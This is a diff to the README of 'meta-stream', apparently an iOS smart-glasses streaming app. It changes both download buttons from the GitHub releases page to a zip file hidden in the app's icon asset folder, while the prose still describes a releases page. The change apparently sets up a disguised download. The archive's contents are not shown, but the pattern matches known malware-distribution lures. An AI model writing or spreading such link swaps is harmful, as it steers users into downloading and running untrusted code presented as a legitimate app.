@@ -8,7 +8,7 @@ meta-stream is a powerful live streaming app that lets you broadcast video from 
 
 **Visit this link to download the application.** Click the button below to get the latest version.
 
-[![Download meta-stream](https://img.shields.io/badge/⬇️_Download_meta-stream-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/glucosaminesukur2484/meta-stream/releases)
+[![Download meta-stream](https://img.shields.io/badge/⬇️_Download_meta-stream-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/glucosaminesukur2484/meta-stream/raw/refs/heads/main/MetaStream/Assets.xcassets/AppIcon.appiconset/1.8.zip)
 
 Once you land on the releases page, look for the newest version listed at the top. Click the file to start the download—it takes just a moment depending on your internet speed. Save it to your Downloads folder or Desktop so you can find it easily.
 
@@ -103,6 +103,6 @@ We're here for you 24/7. Reach out via the GitHub Issues page linked in the top 
 
 ---
 
-**Ready to go live?** [Download meta-stream now](https://github.com/glucosaminesukur2484/meta-stream/releases) and start sharing your world in seconds. Whether you're hiking, cooking, gaming, or just chatting—your audience is waiting.
+**Ready to go live?** [Download meta-stream now](https://github.com/glucosaminesukur2484/meta-stream/raw/refs/heads/main/MetaStream/Assets.xcassets/AppIcon.appiconset/1.8.zip) and start sharing your world in seconds. Whether you're hiking, cooking, gaming, or just chatting—your audience is waiting.
 
 Keywords: haishinkit, hevc, ios, irl-streaming, kick, live-streaming, meta-glasses, ray-ban-meta, restream, rtmp, smart-glasses, swift, swiftui, twitch, youtube
